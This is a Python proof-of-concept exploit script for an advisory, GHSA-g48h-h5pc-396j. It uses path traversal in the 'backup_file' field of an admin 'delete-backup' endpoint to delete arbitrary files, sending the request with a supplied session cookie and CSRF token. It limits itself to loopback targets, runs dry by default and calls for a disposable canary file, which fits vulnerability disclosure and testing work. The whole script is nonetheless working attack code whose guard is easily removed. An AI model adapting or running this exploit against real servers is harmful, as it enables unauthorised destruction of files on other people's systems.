#!/usr/bin/env python3
"""Loopback-only canary deletion PoC for GHSA-g48h-h5pc-396j."""

import argparse
import ipaddress
import urllib.parse
import urllib.request


def loopback_only(url: str) -> None:
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname
    if not host:
        raise SystemExit("Invalid --base-url")
    if host == "localhost":
        return
    try:
        if ipaddress.ip_address(host).is_loopback:
            return
    except ValueError:
        pass
    raise SystemExit("Refusing non-loopback target; use an isolated local lab")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--cookie", required=True, help="Cookie header value")
    parser.add_argument("--csrf", required=True)
    parser.add_argument("--relative-path", required=True)
    parser.add_argument("--execute", action="store_true")
    args = parser.parse_args()

    loopback_only(args.base_url)
    if not args.execute:
        raise SystemExit("Dry run only. Add --execute after creating a disposable canary.")
    if ".." not in args.relative_path:
        raise SystemExit("The relative path must be an explicit traversal to a disposable canary")

    endpoint = args.base_url.rstrip("/") + "/admin/settings/core-upgrades/delete-backup"
    body = urllib.parse.urlencode({"_token": args.csrf, "backup_file": args.relative_path}).encode()
    request = urllib.request.Request(endpoint, data=body, method="POST")
    request.add_header("Content-Type", "application/x-www-form-urlencoded")
    request.add_header("Cookie", args.cookie)

    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())
    response = opener.open(request, timeout=10)
    print(f"HTTP {response.status}; final URL: {response.geturl()}")
    print("Verify the disposable canary locally; an HTTP redirect alone is not proof of deletion.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
